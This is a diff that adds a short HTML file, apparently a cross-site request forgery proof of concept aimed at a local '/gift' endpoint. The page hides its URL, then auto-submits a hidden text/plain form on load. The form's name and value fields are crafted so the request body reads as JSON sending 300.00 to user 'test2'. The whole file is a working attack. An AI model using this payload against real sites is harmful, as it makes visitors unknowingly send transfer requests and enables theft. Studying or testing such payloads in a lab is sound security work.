@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+	<script>history.pushState('', '', '/')</script>
+	<body>
+		<form action="https://127.0.0.1:8000/gift" method="POST" enctype="text/plain">
+			<input type="hidden" name='{"username":"test2", "amount":"300.00", "padding":"'value='something"}' />
+			<input type="submit" value="Submit request"/>
+		</form>
+		<script>
+			document.forms[0].submit();
+		</script>
+	</body>
+</html>
